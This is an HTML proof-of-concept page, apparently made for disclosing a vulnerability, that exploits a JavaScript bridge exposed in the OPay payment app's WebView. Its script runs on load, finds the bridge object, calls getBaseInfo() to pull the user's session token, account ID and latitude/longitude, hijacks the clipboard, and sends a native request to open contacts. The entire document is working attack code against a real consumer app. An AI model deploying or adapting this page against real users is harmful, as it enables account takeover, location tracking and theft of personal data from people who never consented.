<!DOCTYPE html>
<html>
<head>
    <title>OPay Security PoC - Session & Location Leak</title>
    <style>
        body { font-family: sans-serif; padding: 20px; background: #f4f4f4; }
        .log-box { background: white; border: 1px solid #ccc; padding: 10px; height: 300px; overflow-y: scroll; margin-top: 10px; }
        .entry { margin-bottom: 5px; border-bottom: 1px solid #eee; padding-bottom: 5px; }
        .critical { color: red; font-weight: bold; }
        .success { color: green; }
    </style>
</head>
<body>
    <h1>OPay Internal WebView Exploit</h1>
    <p>This page demonstrates the <strong>JsBindingsInterface</strong> vulnerability.</p>
    
    <div id="status">Waiting for JS Bridge...</div>
    <div class="log-box" id="log"></div>

    <script>
        function log(msg, className) {
            const div = document.createElement('div');
            div.className = 'entry ' + (className || '');
            div.innerText = "[" + new Date().toLocaleTimeString() + "] " + msg;
            document.getElementById('log').appendChild(div);
        }

        window.onload = function() {
            log("Page loaded. Initializing exploit...");
            
            // The OPay JS Bridge is typically injected as 'control', 'history', 'OPay3PartyContext', or 'ORideContext'
            const bridgeNames = ['control', 'history', 'OPay3PartyContext', 'ORideContext'];
            let foundBridge = null;

            bridgeNames.forEach(name => {
                if (window[name]) {
                    foundBridge = window[name];
                    log("Found JS Bridge handle: " + name, "success");
                }
            });

            if (foundBridge) {
                document.getElementById('status').innerHTML = "<span class='success'>Bridge Connected!</span>";
                
                // 1. Data Leak via getBaseInfo()
                try {
                    log("Calling getBaseInfo()...");
                    const infoStr = foundBridge.getBaseInfo();
                    log("Raw Response: " + infoStr);
                    const info = JSON.parse(infoStr);
                    
                    log("!!! CRITICAL DATA LEAKED !!!", "critical");
                    log("Session Token: " + info.token, "critical");
                    log("User ID: " + info.accountId, "critical");
                    log("Location: " + info.latitude + ", " + info.longitude, "critical");
                } catch (e) {
                    log("Error leaking base info: " + e.message, "critical");
                }

                // 2. Clipboard Hijack via cpoyToClipboard()
                try {
                    log("Attempting clipboard hijack...");
                    foundBridge.cpoyToClipboard("PWNED_BY_OPAY_POCO");
                    log("Clipboard set to 'PWNED_BY_OPAY_POCO'", "success");
                } catch (e) {
                    log("Error accessing clipboard: " + e.message, "critical");
                }

                // 3. Trigger Bridge Dispatcher for Contact Access
                try {
                    log("Requesting contact access via dispatcher...");
                    const contactPayload = JSON.stringify({
                        functionName: "openContact",
                        functionData: "{}"
                    });
                    // Depending on the version, handleJsBindings or postMessage is used
                    if (foundBridge.handleJsBindings) {
                        foundBridge.handleJsBindings(contactPayload);
                    } else if (foundBridge.postMessage) {
                        foundBridge.postMessage(contactPayload);
                    }
                    log("Sent 'openContact' request to native bridge.");
                } catch (e) {
                    log("Error triggering dispatcher: " + e.message, "critical");
                }
            } else {
                document.getElementById('status').innerHTML = "<span class='critical'>No OPay JS Bridge detected. Ensure this page is opened inside the OPay app.</span>";
                log("Failure: JS Bridge not found.", "critical");
            }
        };
    </script>
</body>
</html>
